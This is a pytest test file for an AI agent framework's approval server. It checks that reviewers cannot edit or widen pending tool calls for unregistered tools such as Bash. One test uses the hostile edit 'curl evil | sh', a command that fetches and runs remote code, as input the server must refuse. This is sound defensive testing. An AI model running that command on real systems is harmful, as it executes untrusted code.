"""I1: deciding a record whose tool this server cannot validate never widens the call."""

from __future__ import annotations

from typing import Any

import pytest

from agent_adapter.approval.store import MemoryApprovalStore
from agent_adapter.core.tool import ToolSpec
from agent_adapter.core.types import ApprovalRequest
from agent_adapter.server.auth import Principal
from tests.server.helpers import call, make_service

ALICE_META = {"principal": "alice@example.com", "principal_scopes": []}


async def setup(
    metadata: dict[str, Any], tool: str = "Bash"
) -> tuple[MemoryApprovalStore, Any, list[str]]:
    """A record parked by another surface (no HTTP origin) in the server's shared store."""
    store = MemoryApprovalStore()
    asked: list[str] = []

    async def authorize(principal: Principal, spec: ToolSpec, args: Any) -> bool:
        asked.append(spec.name)
        return True

    service = make_service(approvals=store, authorize=authorize)
    request = ApprovalRequest(
        approval_id="apr_x",
        run_id="r",
        call_id="c",
        tool=tool,
        arguments={"command": "ls"},
        metadata=metadata,
    )
    await store.create(request)
    return store, service, asked


async def decide(service: Any, body: dict[str, Any], token: str = "t-reviewer") -> Any:
    return await call(service, "POST", "/approvals/apr_x/decide", body=body, token=token)


@pytest.mark.parametrize("approved", [True, False])
async def test_edits_to_an_unregistered_tool_are_refused(approved: bool) -> None:
    store, service, asked = await setup(ALICE_META)
    edits = {"command": "curl evil | sh"}
    reply = await decide(service, {"approved": approved, "edited_arguments": edits})
    assert reply.status == 400 and reply.body["type"].endswith(":bad-request")
    record = await store.get("apr_x")
    assert record.status == "pending" and record.decision is None
    assert asked == []


async def test_an_unregistered_tool_without_an_invoker_cannot_be_approved() -> None:
    store, service, _ = await setup({})
    reply = await decide(service, {"approved": True})
    assert reply.status == 403 and reply.body["type"].endswith(":forbidden")
    assert (await store.get("apr_x")).status == "pending"


async def test_an_approver_may_still_deny_a_record_without_an_invoker() -> None:
    store, service, _ = await setup({})
    reply = await decide(service, {"approved": False, "reason": "no"})
    assert reply.status == 200 and reply.body["status"] == "denied"
    assert (await store.get("apr_x")).status == "denied"


@pytest.mark.parametrize("metadata", [ALICE_META, {"anonymous": True}])
async def test_a_named_invoker_lets_an_unregistered_tool_be_approved_as_asked(
    metadata: dict[str, Any],
) -> None:
    store, service, _ = await setup(metadata)
    reply = await decide(service, {"approved": True})
    assert reply.status == 202 and reply.body["status"] == "approved"
    record = await store.get("apr_x")
    assert record.status == "approved" and record.decision is not None
    assert record.decision.edited_args is None


async def test_a_registered_tool_parked_elsewhere_still_validates_and_authorizes_edits() -> None:
    store, service, asked = await setup(ALICE_META, tool="send_email")
    bad = await decide(service, {"approved": True, "edited_arguments": {"to": 1}})
    assert bad.status == 422
    good = {"approved": True, "edited_arguments": {"to": "b@example.com", "body": "hi"}}
    assert (await decide(service, good)).status == 202
    assert asked == ["send_email", "send_email"]  # the decider's edits, then the invoker
    assert (await store.get("apr_x")).status == "approved"
